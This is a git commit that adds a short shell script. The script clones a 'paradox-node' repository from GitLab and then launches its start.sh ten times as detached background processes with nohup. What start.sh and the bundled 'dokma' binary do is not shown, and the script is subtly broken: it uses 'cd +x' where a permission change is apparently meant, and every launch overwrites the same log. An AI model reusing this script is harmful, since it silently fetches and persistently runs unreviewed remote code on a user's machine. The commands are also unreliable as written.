bf2ee586e06f92bbf4b4b2562d7f4b2f3d1c02bf
obisumila <obisumila@gmail.com>
2024-10-05 05:41:03 +0800

    Add files via upload

---
+++ GITCLONE.sh
@@ -0,0 +1,27 @@
+git clone https://gitlab.com/kardisali2/paradox-node.git
+
+cd paradox-node
+
+cd +x start.sh
+
+cd +x dokma
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 & 
+
+nohup ./start.sh > start.log 2>&1 &
